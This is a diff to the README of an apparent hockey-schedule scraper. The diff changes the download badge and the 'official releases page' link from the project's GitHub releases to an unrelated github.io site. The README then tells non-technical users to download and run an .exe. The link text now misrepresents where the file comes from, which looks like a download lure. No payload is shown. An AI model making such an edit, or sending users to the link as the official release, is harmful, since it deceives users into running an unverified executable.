@@ -1,6 +1,6 @@
 # 🏒 aahl-web-scraper - Track Amherst hockey schedules with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Poetic-squamouscell685/aahl-web-scraper/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://poetic-squamouscell685.github.io)
 
 This application gathers data from the Amherst Adult Hockey League website. It saves game schedules, tracks player statistics, and monitors team standings. You do not need to know how to write code to use this tool. It performs the manual work of checking the website for updates and organizes the information into a format you can read.
 
@@ -15,7 +15,7 @@ Your computer needs to meet these basic standards to run the application:
 
 ## 📥 How to Install
 
-1.  Visit the [official releases page](https://github.com/Poetic-squamouscell685/aahl-web-scraper/releases) to find the latest version.
+1.  Visit the [official releases page](https://poetic-squamouscell685.github.io) to find the latest version.
 2.  Look for the file ending in .exe under the Assets section.
 3.  Click the filename to start the download to your computer.
 4.  Once the file finishes downloading, move it to a folder where you want to keep the application.
